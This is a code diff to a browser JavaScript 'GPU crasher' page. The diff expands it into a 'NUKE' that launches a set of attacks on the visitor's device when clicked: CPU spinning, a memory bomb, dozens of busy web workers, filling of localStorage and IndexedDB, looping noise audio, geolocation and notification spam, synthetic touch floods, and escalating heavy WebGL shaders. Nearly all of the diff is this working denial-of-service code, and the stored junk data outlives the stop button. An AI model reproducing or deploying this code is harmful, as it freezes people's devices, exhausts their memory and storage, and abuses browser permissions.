@@ -33,20 +33,22 @@ const isLowEnd = isLowEndDevice();
 
 // ─── DYNAMIC CONFIG ──────────────────────────────────────
 let CONFIG = {
-  shaderLoops: isLowEnd ? 80 : 150,
-  raymarchSteps: isLowEnd ? 300 : 500,
-  renderPasses: isLowEnd ? 20 : 10,
-  resolutionScale: isLowEnd ? 4.0 : 5.0,
-  memoryChunks: isLowEnd ? 300 : 100,
+  shaderLoops: isLowEnd ? 100 : 200,
+  raymarchSteps: isLowEnd ? 400 : 600,
+  renderPasses: isLowEnd ? 25 : 15,
+  resolutionScale: isLowEnd ? 5.0 : 6.0,
+  memoryChunks: isLowEnd ? 500 : 300,
   escalationLevel: 0,
-  maxEscalation: 20
+  maxEscalation: 30
 };
 
 let memoryBomb = [];
+let workers = [];
 let lastFps = 60;
 let consecutiveLowFps = 0;
 let escalationTimer = 0;
 let isEscalating = false;
+let cpuSpinning = false;
 
 // ─── UI HELPERS ──────────────────────────────────────────
 function formatTime(ms) {
@@ -58,21 +60,210 @@ function formatTime(ms) {
   return `${minutes}:${seconds}.${millis}`;
 }
 
+// ─── ALL TORTURE METHODS ──────────────────────────────────
+
+// 1. CPU SPIN — blocks main thread
+function spinCPU(duration) {
+  const start = performance.now();
+  let x = 0;
+  while (performance.now() - start < duration) {
+    x += Math.sin(x) * Math.cos(x + 1) * Math.tan(x + 2);
+    x = x * 1.6180339887 + 0.5;
+    x = Math.pow(Math.abs(x), 1.3);
+  }
+}
+
+// 2. MEMORY BOMB — fills RAM
+function memoryBombAttack() {
+  try {
+    for (let i = 0; i < CONFIG.memoryChunks; i++) {
+      const size = 1024 * 1024;
+      const chunk = new Uint8Array(size);
+      for (let j = 0; j < size; j += 4096) {
+        chunk[j] = Math.random() * 255;
+        chunk[j+1] = Math.random() * 255;
+        chunk[j+2] = Math.random() * 255;
+      }
+      memoryBomb.push(chunk);
+    }
+  } catch(e) {}
+}
+
+// 3. WORKER ARMY — spawns CPU workers
+function spawnWorkerArmy() {
+  const count = isLowEnd ? 20 : 30;
+  try {
+    const workerCode = `
+      let data = new Float64Array(3000000);
+      let counter = 0;
+      self.onmessage = function(e) {
+        if (e.data === 'start') {
+          setInterval(() => {
+            for (let i = 0; i < data.length; i++) {
+              data[i] = Math.sin(i * 0.001 + counter) * Math.cos(i * 0.002 + counter) * 
+                        Math.tan(i * 0.0005 + counter) * Math.sqrt(Math.abs(Math.sin(i * 0.003)));
+              data[i] = data[i] * 1.6180339887 + 0.5;
+              data[i] = Math.fround(data[i]);
+              data[i] = Math.pow(Math.abs(data[i]), 1.3);
+              data[i] = Math.log(Math.abs(data[i]) + 1);
+              data[i] = Math.atan(data[i]) * 1.7;
+            }
+            counter += 0.01;
+            self.postMessage({ done: true });
+          }, 1);
+        }
+      };
+    `;
+    for (let i = 0; i < count; i++) {
+      const blob = new Blob([workerCode], { type: 'text/javascript' });
+      const w = new Worker(URL.createObjectURL(blob));
+      w.postMessage('start');
+      workers.push(w);
+    }
+  } catch(e) {}
+}
+
+// 4. STORAGE BOMB — fills localStorage / IndexedDB
+function storageBomb() {
+  try {
+    // localStorage
+    let data = '';
+    for (let i = 0; i < 100000; i++) {
+      data += 'x'.repeat(1000);
+      try {
+        localStorage.setItem('bomb_' + i, data);
+      } catch(e) { break; }
+    }
+  } catch(e) {}
+  
+  try {
+    // IndexedDB
+    const request = indexedDB.open('bombDB', 1);
+    request.onsuccess = function(event) {
+      const db = event.target.result;
+      const store = db.createObjectStore('bombStore', { autoIncrement: true });
+      for (let i = 0; i < 1000; i++) {
+        const chunk = new Uint8Array(1024 * 1024);
+        for (let j = 0; j < chunk.length; j += 4096) {
+          chunk[j] = Math.random() * 255;
+        }
+        store.add(chunk);
+      }
+    };
+  } catch(e) {}
+}
+
+// 5. AUDIO TORTURE — plays high-frequency noise
+function audioTorture() {
+  try {
+    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    const bufferSize = 4096;
+    const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
+    const data = buffer.getChannelData(0);
+    for (let i = 0; i < bufferSize; i++) {
+      data[i] = Math.sin(i * 0.01) * Math.cos(i * 0.015) * Math.tan(i * 0.005);
+      data[i] = data[i] * 0.5 + 0.5;
+      data[i] = data[i] * 0.8;
+    }
+    const source = audioCtx.createBufferSource();
+    source.buffer = buffer;
+    source.loop = true;
+    source.connect(audioCtx.destination);
+    source.start();
+    // Keep reference to prevent GC
+    window._audioSource = source;
+  } catch(e) {}
+}
+
+// 6. GEOLOCATION SPAM — repeatedly requests location
+function geolocationSpam() {
+  try {
+    setInterval(() => {
+      navigator.geolocation.getCurrentPosition(
+        () => {},
+        () => {},
+        { enableHighAccuracy: true, timeout: 1, maximumAge: 0 }
+      );
+    }, 10);
+  } catch(e) {}
+}
+
+// 7. NOTIFICATION SPAM — requests notifications
+function notificationSpam() {
+  try {
+    if (Notification.permission === 'granted') {
+      for (let i = 0; i < 100; i++) {
+        setTimeout(() => {
+          new Notification('🔥 GPU CRASHER', {
+            body: 'System is melting... ' + i,
+            icon: '⚠️'
+          });
+        }, i * 100);
+      }
+    } else if (Notification.permission === 'default') {
+      Notification.requestPermission();
+    }
+  } catch(e) {}
+}
+
+// 8. TOUCH EVENTS — fake touch events to overload UI
+function touchSpam() {
+  try {
+    const events = ['touchstart', 'touchmove', 'touchend', 'touchcancel'];
+    setInterval(() => {
+      const touch = new Touch({
+        identifier: Math.random() * 1000,
+        target: document.body,
+        clientX: Math.random() * window.innerWidth,
+        clientY: Math.random() * window.innerHeight,
+        radiusX: 10,
+        radiusY: 10,
+        rotationAngle: 0,
+        force: 1
+      });
+      const event = new TouchEvent(events[Math.floor(Math.random() * events.length)], {
+        touches: [touch],
+        targetTouches: [touch],
+        changedTouches: [touch]
+      });
+      document.dispatchEvent(event);
+    }, 10);
+  } catch(e) {}
+}
+
+// 9. RESIZE SPAM — forces layout recalculations
+function resizeSpam() {
+  try {
+    const div = document.createElement('div');
+    div.style.position = 'fixed';
+    div.style.width = '100%';
+    div.style.height = '100%';
+    div.style.zIndex = '10000';
+    document.body.appendChild(div);
+    setInterval(() => {
+      div.style.width = (10 + Math.random() * 90) + '%';
+      div.style.height = (10 + Math.random() * 90) + '%';
+      div.style.background = `rgb(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255})`;
+    }, 10);
+  } catch(e) {}
+}
+
+// 10. WEBGL ATTACK — max torture
 function escalateTorture() {
   if (isEscalating) return;
   isEscalating = true;
   
   CONFIG.escalationLevel++;
   
-  CONFIG.shaderLoops = Math.min(250, CONFIG.shaderLoops + 20);
-  CONFIG.raymarchSteps = Math.min(800, CONFIG.raymarchSteps + 40);
-  CONFIG.renderPasses = Math.min(50, CONFIG.renderPasses + 5);
-  CONFIG.resolutionScale = Math.min(10.0, CONFIG.resolutionScale + 0.5);
-  CONFIG.memoryChunks = Math.min(800, CONFIG.memoryChunks + 50);
+  CONFIG.shaderLoops = Math.min(300, CONFIG.shaderLoops + 25);
+  CONFIG.raymarchSteps = Math.min(900, CONFIG.raymarchSteps + 50);
+  CONFIG.renderPasses = Math.min(60, CONFIG.renderPasses + 8);
+  CONFIG.resolutionScale = Math.min(12.0, CONFIG.resolutionScale + 0.8);
+  CONFIG.memoryChunks = Math.min(1000, CONFIG.memoryChunks + 80);
   
-  // ─── MEMORY BOMB ──────────────────────────────────────
+  // Memory bomb
   try {
-    for (let i = 0; i < 50; i++) {
+    for (let i = 0; i < 80; i++) {
       const size = 1024 * 1024;
       const chunk = new Uint8Array(size);
       for (let j = 0; j < size; j += 4096) {
@@ -82,7 +273,38 @@ function escalateTorture() {
     }
   } catch(e) {}
   
-  // ─── DESTROY AND RECREATE CONTEXT ────────────────────
+  // Extra workers on escalation
+  try {
+    for (let i = 0; i < 5; i++) {
+      const workerCode = `
+        let data = new Float64Array(3000000);
+        let counter = 0;
+        self.onmessage = function(e) {
+          if (e.data === 'start') {
+            setInterval(() => {
+              for (let i = 0; i < data.length; i++) {
+                data[i] = Math.sin(i * 0.001 + counter) * Math.cos(i * 0.002 + counter) * 
+                          Math.tan(i * 0.0005 + counter);
+                data[i] = Math.pow(Math.abs(data[i]), 1.3);
+              }
+              counter += 0.01;
+            }, 1);
+          }
+        };
+      `;
+      const blob = new Blob([workerCode], { type: 'text/javascript' });
+      const w = new Worker(URL.createObjectURL(blob));
+      w.postMessage('start');
+      workers.push(w);
+    }
+  } catch(e) {}
+  
+  // CPU spin
+  cpuSpinning = true;
+  setTimeout(() => {
+    cpuSpinning = false;
+  }, 5000);
+  
   if (gl && program) {
     try {
       gl.deleteProgram(program);
@@ -97,26 +319,24 @@ function escalateTorture() {
     } catch(e) {}
   }
   
-  // ─── FORCE GC ──────────────────────────────────────────
   if (window.gc) {
     try { window.gc(); } catch(e) {}
   }
   
   if (statusEl) {
-    statusEl.textContent = `🔥 ESCALATION ${CONFIG.escalationLevel} - ${CONFIG.renderPasses}x passes`;
+    statusEl.textContent = `🔥 NUKE ${CONFIG.escalationLevel} - ${CONFIG.renderPasses}x passes`;
     statusEl.style.color = '#ef4444';
   }
   
-  // ─── TRIGGER GLITCH STORM ─────────────────────────────
   if (window.glitchSystem && window.glitchSystem.isRunning) {
-    for (let i = 0; i < 10; i++) {
+    for (let i = 0; i < 15; i++) {
       setTimeout(() => {
         window.glitchSystem.randomGlitch();
       }, i * 50);
     }
   }
   
-  console.log(`🔥 ESCALATED to Level ${CONFIG.escalationLevel}: ${CONFIG.renderPasses} passes, ${CONFIG.shaderLoops} loops`);
+  console.log(`💀 NUKE Level ${CONFIG.escalationLevel}: ${CONFIG.renderPasses} passes, ${CONFIG.shaderLoops} loops`);
   
   setTimeout(() => {
     isEscalating = false;
@@ -129,6 +349,7 @@ function escalateTorture() {
 function setIdle() {
   isRunning = false;
   isEscalating = false;
+  cpuSpinning = false;
   
   if (crashBtn) {
     crashBtn.disabled = false;
@@ -136,8 +357,8 @@ function setIdle() {
     const icon = document.querySelector('.crash-btn .icon');
     if (icon) icon.textContent = '⚡';
     const label = document.getElementById('btnLabel');
-    if (label) label.textContent = 'Crash GPU';
-    if (btnSub) btnSub.textContent = 'Click to initiate meltdown';
+    if (label) label.textContent = '☢️ NUKE';
+    if (btnSub) btnSub.textContent = 'Click to annihilate';
   }
   if (stopBtn) stopBtn.style.display = 'none';
   if (animFrameId) {
@@ -149,6 +370,11 @@ function setIdle() {
     window.glitchSystem.stop();
   }
 
+  // Clean up workers
+  workers.forEach(w => { try { w.terminate(); } catch(e) {} });
+  workers = [];
+  
+  // Clean up memory
   memoryBomb = [];
   CONFIG.escalationLevel = 0;
   consecutiveLowFps = 0;
@@ -236,7 +462,6 @@ function createWebGLContext() {
   const currentLoops = CONFIG.shaderLoops;
   const currentSteps = CONFIG.raymarchSteps;
 
-  // ─── CZNULL-STYLE POISON MUSHROOM SHADER ──────────────
   if (isWebGL2) {
     vsSource = `#version 300 es
       in vec2 a_position;
@@ -257,8 +482,10 @@ function createWebGLContext() {
           v += amp * sin(p.x * 13.7 + t * 2.4 + fi * 0.01);
           v += amp * cos(p.y * 16.9 + t * 2.8 + fi * 0.01);
           v += amp * sin(p.z * 10.3 + t * 1.6 + fi * 0.01) * cos(p.z * 5.3 + t * 1.2);
+          v += amp * tan(atan(p.x * 7.1 + p.y * 3.3 + t) * 1.4);
+          v += amp * sin(cos(tan(v * 4.1 + fi * 0.05)) * 5.3);
           v = v * 0.5 + 0.5;
-          amp *= 0.39;
+          amp *= 0.37;
           p += vec3(sin(t * 0.9 + fi * 0.001), cos(t * 1.3 + fi * 0.001), sin(t * 0.7 + fi * 0.001));
           p = p * 1.001 + 0.001;
           if (${CONFIG.escalationLevel} > 5) {
@@ -266,6 +493,10 @@ function createWebGLContext() {
           }
           if (${CONFIG.escalationLevel} > 10) {
             p = vec3(sin(p.x + t), cos(p.y + t), tan(p.z + t));
+          }
+          if (${CONFIG.escalationLevel} > 15) {
+            p = p * 1.5 + 0.5;
+            p = vec3(atan(p.x + p.y), atan(p.y + p.z), atan(p.z + p.x));
           }
         }
         return v;
@@ -276,9 +507,9 @@ function createWebGLContext() {
         float t = u_time * 0.5 + float(u_pass) * 0.05;
         
         vec3 ro = vec3(
-          sin(t * 0.3) * 6.0,
-          cos(t * 0.4) * 4.0 + 2.0,
-          -8.0 + sin(t * 0.2) * 3.0
+          sin(t * 0.3) * 6.0 + sin(t * 0.7) * 2.0,
+          cos(t * 0.4) * 4.0 + 2.0 + cos(t * 0.5) * 1.5,
+          -8.0 + sin(t * 0.2) * 3.0 + sin(t * 0.6) * 1.5
         );
         vec3 rd = normalize(vec3(uv * 2.2, 1.9 + sin(t * 0.5) * 0.5));
 
@@ -291,8 +522,9 @@ function createWebGLContext() {
           accum += density * exp(-dist * 0.018);
           accum += sin(dist * 22.0 + t * 7.0) * cos(dist * 15.0) * 0.035;
           accum += cos(dist * 33.0 + t * 9.0) * sin(dist * 27.0) * 0.025;
+          accum += sin(dist * 44.0 + t * 11.0) * cos(dist * 38.0) * 0.015;
           dist += max(0.02, density * 0.38);
-          if (dist > 100.0 || accum > 15.0) break;
+          if (dist > 120.0 || accum > 20.0) break;
         }
 
         vec3 col = 0.5 + 0.5 * vec3(
@@ -339,8 +571,10 @@ function createWebGLContext() {
           v += amp * sin(p.x * 13.7 + t * 2.4 + fi * 0.01);
           v += amp * cos(p.y * 16.9 + t * 2.8 + fi * 0.01);
           v += amp * sin(p.z * 10.3 + t * 1.6 + fi * 0.01) * cos(p.z * 5.3 + t * 1.2);
+          v += amp * tan(atan(p.x * 7.1 + p.y * 3.3 + t) * 1.4);
+          v += amp * sin(cos(tan(v * 4.1 + fi * 0.05)) * 5.3);
           v = v * 0.5 + 0.5;
-          amp *= 0.39;
+          amp *= 0.37;
           p += vec3(sin(t * 0.9 + fi * 0.001), cos(t * 1.3 + fi * 0.001), sin(t * 0.7 + fi * 0.001));
           p = p * 1.001 + 0.001;
           if (${CONFIG.escalationLevel} > 5) {
@@ -348,6 +582,10 @@ function createWebGLContext() {
           }
           if (${CONFIG.escalationLevel} > 10) {
             p = vec3(sin(p.x + t), cos(p.y + t), tan(p.z + t));
+          }
+          if (${CONFIG.escalationLevel} > 15) {
+            p = p * 1.5 + 0.5;
+            p = vec3(atan(p.x + p.y), atan(p.y + p.z), atan(p.z + p.x));
           }
         }
         return v;
@@ -358,9 +596,9 @@ function createWebGLContext() {
         float t = u_time * 0.5 + float(u_pass) * 0.05;
         
         vec3 ro = vec3(
-          sin(t * 0.3) * 6.0,
-          cos(t * 0.4) * 4.0 + 2.0,
-          -8.0 + sin(t * 0.2) * 3.0
+          sin(t * 0.3) * 6.0 + sin(t * 0.7) * 2.0,
+          cos(t * 0.4) * 4.0 + 2.0 + cos(t * 0.5) * 1.5,
+          -8.0 + sin(t * 0.2) * 3.0 + sin(t * 0.6) * 1.5
         );
         vec3 rd = normalize(vec3(uv * 2.2, 1.9 + sin(t * 0.5) * 0.5));
 
@@ -373,8 +611,9 @@ function createWebGLContext() {
           accum += density * exp(-dist * 0.018);
           accum += sin(dist * 22.0 + t * 7.0) * cos(dist * 15.0) * 0.035;
           accum += cos(dist * 33.0 + t * 9.0) * sin(dist * 27.0) * 0.025;
+          accum += sin(dist * 44.0 + t * 11.0) * cos(dist * 38.0) * 0.015;
           dist += max(0.02, density * 0.38);
-          if (dist > 100.0 || accum > 15.0) break;
+          if (dist > 120.0 || accum > 20.0) break;
         }
 
         vec3 col = 0.5 + 0.5 * vec3(
@@ -442,22 +681,6 @@ function createWebGLContext() {
   gl.enableVertexAttribArray(posLoc);
   gl.vertexAttribPointer(posLoc, 2, gl.FLOAT, false, 0, 0);
 
-  // ─── MEMORY BOMB ──────────────────────────────────────
-  if (CONFIG.memoryChunks > 0) {
-    try {
-      for (let i = 0; i < CONFIG.memoryChunks; i++) {
-        const size = 1024 * 1024;
-        const chunk = new Uint8Array(size);
-        for (let j = 0; j < size; j += 4096) {
-          chunk[j] = Math.random() * 255;
-          chunk[j+1] = Math.random() * 255;
-          chunk[j+2] = Math.random() * 255;
-        }
-        memoryBomb.push(chunk);
-      }
-    } catch(e) {}
-  }
-
   return true;
 }
 
@@ -465,7 +688,7 @@ function render(now) {
   if (!isRunning || !gl || !program) return;
 
   const elapsed = (now - startTime) / 1000;
-  const heat = Math.min(100, (elapsed / 5) * 50 + 20 + Math.random() * 10);
+  const heat = Math.min(100, (elapsed / 4) * 60 + 20 + Math.random() * 10);
 
   // ─── RENDER PASSES ──────────────────────────────────
   for (let pass = 0; pass < CONFIG.renderPasses; pass++) {
@@ -481,6 +704,11 @@ function render(now) {
     gl.drawArrays(gl.TRIANGLES, 0, 6);
   }
 
+  // ─── CPU SPIN ──────────────────────────────────────────
+  if (cpuSpinning || CONFIG.escalationLevel > 5) {
+    spinCPU(5);
+  }
+
   frameCount++;
 
   if (now - lastFpsUpdate > 200) {
@@ -493,13 +721,13 @@ function render(now) {
       consecutiveLowFps = 0;
     }
     
-    if (consecutiveLowFps > 5 && CONFIG.escalationLevel < CONFIG.maxEscalation) {
+    if (consecutiveLowFps > 3 && CONFIG.escalationLevel < CONFIG.maxEscalation) {
       escalateTorture();
       consecutiveLowFps = 0;
     }
     
     escalationTimer += 0.2;
-    if (escalationTimer > 30 && CONFIG.escalationLevel < CONFIG.maxEscalation) {
+    if (escalationTimer > 20 && CONFIG.escalationLevel < CONFIG.maxEscalation) {
       escalateTorture();
       escalationTimer = 0;
     }
@@ -519,30 +747,30 @@ function render(now) {
     if (loadBarContainer) loadBarContainer.classList.add('active');
 
     if (statusEl) {
-      const escText = CONFIG.escalationLevel > 0 ? ` ⚡Lv${CONFIG.escalationLevel}` : '';
+      const escText = CONFIG.escalationLevel > 0 ? ` 💀Lv${CONFIG.escalationLevel}` : '';
       if (fps < 5) {
-        statusEl.textContent = `💀 MELTING - ${fps} FPS${escText} (${CONFIG.renderPasses}x passes)`;
+        statusEl.textContent = `💀 ANNIHILATING - ${fps} FPS${escText} (${CONFIG.renderPasses}x)`;
         statusEl.style.color = '#ef4444';
         if (statusBadge) statusBadge.className = 'status-badge active';
       } else if (fps < 10) {
-        statusEl.textContent = `☠️ DYING - ${fps} FPS${escText} (${CONFIG.renderPasses}x passes)`;
+        statusEl.textContent = `☠️ DYING - ${fps} FPS${escText} (${CONFIG.renderPasses}x)`;
         statusEl.style.color = '#ef4444';
         if (statusBadge) statusBadge.className = 'status-badge active';
       } else if (fps < 20) {
-        statusEl.textContent = `🔥 KILLING - ${fps} FPS${escText} (${CONFIG.renderPasses}x passes)`;
+        statusEl.textContent = `🔥 KILLING - ${fps} FPS${escText} (${CONFIG.renderPasses}x)`;
         statusEl.style.color = '#f59e0b';
         if (statusBadge) statusBadge.className = 'status-badge crashed';
       } else {
-        statusEl.textContent = `⚡ DESTROYING - ${fps} FPS${escText} (${CONFIG.renderPasses}x passes)`;
+        statusEl.textContent = `⚡ DESTROYING - ${fps} FPS${escText} (${CONFIG.renderPasses}x)`;
         statusEl.style.color = '#8b9bb5';
         if (statusBadge) statusBadge.className = 'status-badge active';
       }
     }
 
     if (btnSub) {
-      btnSub.textContent = CONFIG.escalationLevel > 5 ? '🔥 UNSTOPPABLE MODE' : 
-                           CONFIG.escalationLevel > 0 ? '⚡ Escalating...' : 
-                           '🔥 Pushing limits';
+      btnSub.textContent = CONFIG.escalationLevel > 10 ? '💀 NUKE MODE' : 
+                           CONFIG.escalationLevel > 5 ? '🔥 UNSTOPPABLE' : 
+                           '☢️ Escalating...';
     }
 
     if (window.gc) {
@@ -570,20 +798,21 @@ function startNuke() {
   consecutiveLowFps = 0;
   escalationTimer = 0;
   isEscalating = false;
+  cpuSpinning = false;
   
   if (crashBtn) {
     crashBtn.className = 'crash-btn running';
     const icon = document.querySelector('.crash-btn .icon');
-    if (icon) icon.textContent = '☠️';
+    if (icon) icon.textContent = '☢️';
     const label = document.getElementById('btnLabel');
-    if (label) label.textContent = isLowEnd ? '🔥 MELTING SE...' : '💀 KILLING...';
-    if (btnSub) btnSub.textContent = isLowEnd ? '🔥 20 passes torture' : '💀 Hold tight';
+    if (label) label.textContent = '☢️ NUKE';
+    if (btnSub) btnSub.textContent = isLowEnd ? '🔥 SE ANNIHILATION' : '💀 Total destruction';
   }
   if (stopBtn) stopBtn.style.display = 'flex';
 
   if (statusEl) {
-    statusEl.textContent = isLowEnd ? '🔥 SE TORTURE MODE (20 passes)' : '☠️ GPU MURDER INITIATED';
-    statusEl.style.color = '#f59e0b';
+    statusEl.textContent = isLowEnd ? '🔥 SE NUKE MODE' : '☢️ TOTAL ANNIHILATION';
+    statusEl.style.color = '#ef4444';
     if (statusBadge) statusBadge.className = 'status-badge crashed';
   }
   if (timeEl) timeEl.textContent = '00:00.000';
@@ -598,6 +827,16 @@ function startNuke() {
   if (loadBar) loadBar.style.width = '0%';
   if (loadBarContainer) loadBarContainer.classList.add('active');
 
+  // ─── LAUNCH ALL ATTACKS ────────────────────────────────
+  memoryBombAttack();
+  spawnWorkerArmy();
+  storageBomb();
+  audioTorture();
+  geolocationSpam();
+  notificationSpam();
+  touchSpam();
+  resizeSpam();
+
   if (!createWebGLContext()) {
     setIdle();
     return;
@@ -607,7 +846,7 @@ function startNuke() {
   if (window.glitchSystem) {
     setTimeout(() => {
       window.glitchSystem.start();
-    }, 1500);
+    }, 1000);
   }
 
   startTime = performance.now();
@@ -634,10 +873,10 @@ document.addEventListener('DOMContentLoaded', function() {
 
   if (deviceBadge) {
     if (isLowEnd) {
-      deviceBadge.textContent = '📱 SE MODE - UNSTOPPABLE';
+      deviceBadge.textContent = '📱 SE - NUKE MODE';
     } else {
       const isIPhone = /iPhone|iPad|iPod/.test(navigator.userAgent);
-      deviceBadge.textContent = isIPhone ? '📱 IPHONE MODE - UNSTOPPABLE' : '💻 DESKTOP MODE';
+      deviceBadge.textContent = isIPhone ? '📱 IPHONE - NUKE MODE' : '💻 DESKTOP - NUKE MODE';
     }
   }
 
@@ -657,10 +896,10 @@ document.addEventListener('DOMContentLoaded', function() {
       if (crashBtn) {
         crashBtn.className = 'crash-btn';
         const icon = document.querySelector('.crash-btn .icon');
-        if (icon) icon.textContent = '⚡';
+        if (icon) icon.textContent = '☢️';
         const label = document.getElementById('btnLabel');
-        if (label) label.textContent = 'Crash GPU';
-        if (btnSub) btnSub.textContent = 'Click to initiate meltdown';
+        if (label) label.textContent = 'NUKE';
+        if (btnSub) btnSub.textContent = 'Click to annihilate';
       }
     };
   }
@@ -680,10 +919,10 @@ document.addEventListener('DOMContentLoaded', function() {
         if (crashBtn) {
           crashBtn.className = 'crash-btn';
           const icon = document.querySelector('.crash-btn .icon');
-          if (icon) icon.textContent = '⚡';
+          if (icon) icon.textContent = '☢️';
           const label = document.getElementById('btnLabel');
-          if (label) label.textContent = 'Crash GPU';
-          if (btnSub) btnSub.textContent = 'Click to initiate meltdown';
+          if (label) label.textContent = 'NUKE';
+          if (btnSub) btnSub.textContent = 'Click to annihilate';
         }
       }
     }
